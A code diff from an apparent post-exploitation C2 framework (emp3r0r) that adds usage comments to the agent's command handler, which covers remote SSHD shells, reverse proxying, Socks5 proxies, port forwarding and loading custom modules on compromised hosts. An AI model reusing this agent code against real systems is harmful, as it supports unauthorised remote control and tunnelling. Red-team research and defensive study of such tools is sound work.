@@ -24,7 +24,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	switch cmdSlice[0] {
 
 	// stat file
-	// !stat --path '/path/to/a file name.txt'
+	// Usage: !stat --path <path>
+	// Retrieves file statistics for the specified path.
 	case emp3r0r_data.C2CmdStat:
 		path := flags.StringP("path", "p", "", "Path to stat")
 		flags.Parse(cmdSlice[1:])
@@ -51,6 +52,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !bring2cc --addr target_agent_ip
+	// Usage: !bring2cc --addr <target_agent_ip>
+	// Sets up a reverse proxy to the specified agent IP address.
 	case emp3r0r_data.C2CmdBring2CC:
 		addr := flags.StringP("addr", "a", "", "Target agent IP address")
 		flags.Parse(cmdSlice[1:])
@@ -80,9 +83,9 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		}
 		return
 
+	// Usage: !sshd --shell <shell> --port <port> --args <args>
+	// Starts an SSHD server with the specified shell, port, and arguments.
 	case emp3r0r_data.C2CmdSSHD:
-		// sshd server
-		// !sshd --shell shell --port port --args args
 		shell := flags.StringP("shell", "s", "", "Shell to use")
 		port := flags.StringP("port", "p", "", "Port to use")
 		args := flags.StringSliceP("args", "a", []string{}, "Arguments for SSHD")
@@ -110,6 +113,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !proxy --mode on --addr 0.0.0.0:12345
+	// Usage: !proxy --mode <mode> --addr <address>
+	// Starts a Socks5 proxy server with the specified mode and address.
 	case emp3r0r_data.C2CmdProxy:
 		mode := flags.StringP("mode", "m", "", "Proxy mode")
 		addr := flags.StringP("addr", "a", "", "Address to bind")
@@ -130,6 +135,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !port_fwd --to/listen [to/listen] --shID [shID] --operation/protocol [operation/protocol] --timeout [timeout]
+	// Usage: !port_fwd --to <target> --shID <session_id> --operation <operation> --timeout <timeout>
+	// Sets up port forwarding with the specified parameters.
 	case emp3r0r_data.C2CmdPortFwd:
 		to := flags.StringP("to", "t", "", "Target address")
 		sessionID := flags.StringP("shID", "s", "", "Session ID")
@@ -168,6 +175,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !delete_portfwd --id id
+	// Usage: !delete_portfwd --id <session_id>
+	// Deletes the specified port forwarding session.
 	case emp3r0r_data.C2CmdDeletePortFwd:
 		id := flags.StringP("id", "i", "", "Session ID")
 		flags.Parse(cmdSlice[1:])
@@ -182,6 +191,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !utils
+	// Usage: !utils
+	// Executes utility functions on the agent.
 	case emp3r0r_data.C2CmdUtils:
 		out = VaccineHandler()
 		if out != "[+] Utils have been successfully installed" {
@@ -190,6 +201,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !custom_module --mod_name mod_name --checksum checksum
+	// Usage: !custom_module --mod_name <module_name> --checksum <checksum> --in_mem <in_memory>
+	// Loads a custom module with the specified name and checksum.
 	case emp3r0r_data.C2CmdCustomModule:
 		modName := flags.StringP("mod_name", "m", "", "Module name")
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
@@ -203,6 +216,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !upgrade_agent --checksum checksum
+	// Usage: !upgrade_agent --checksum <checksum>
+	// Upgrades the agent with the specified checksum.
 	case emp3r0r_data.C2CmdUpdateAgent:
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		flags.Parse(cmdSlice[1:])
